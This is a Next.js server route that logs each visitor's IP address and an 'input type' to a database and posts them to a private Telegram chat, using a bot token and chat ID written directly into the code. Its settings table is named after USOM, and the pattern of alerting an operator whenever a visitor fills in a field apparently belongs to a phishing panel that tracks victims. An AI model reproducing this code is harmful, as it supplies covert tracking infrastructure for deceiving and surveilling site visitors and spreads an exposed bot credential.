import { NextRequest, NextResponse } from 'next/server';
import pool from '@/lib/db';

export async function POST(request: NextRequest) {
    try {
        const { inputType } = await request.json();
        
        // IP adresini al
        const forwarded = request.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0].trim() : 
                   request.headers.get('x-real-ip') || 'Bilinmiyor';

        // Tarih ve saat
        const tarih = new Date().toLocaleString('tr-TR', {
            timeZone: 'Europe/Istanbul',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        // Kayıt ekle
        await pool.query(
            'INSERT INTO input_logs (ip, input_type) VALUES (?, ?)',
            [ip, inputType]
        );

        // Telegram bildirimi gönder (toggle kontrolü)
        let shouldNotify = true;
        try {
            const [rows] = await pool.query('SELECT log_notify FROM usom_settings WHERE id = 1') as any[];
            if (rows?.[0] && rows[0].log_notify === 0) shouldNotify = false;
        } catch {}

        if (shouldNotify) {
            const msg = `📝 <b>YENİ INPUT LOG</b>\n\n📋 Input Tipi: ${inputType}\n🌐 IP: ${ip}\n📅 Tarih: ${tarih}`;
            fetch('https://api.telegram.org/bot8833761305:AAGzA0xdVIpD_7otKw_3ElteNG2lcOQE4do/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: '-1003848607886', text: msg, parse_mode: 'HTML' }),
            }).catch(() => {});
        }

        return NextResponse.json({ success: true });
    } catch (error: any) {
        console.error('Input log hatası:', error);
        return NextResponse.json({ success: false, error: error.message }, { status: 500 });
    }
}
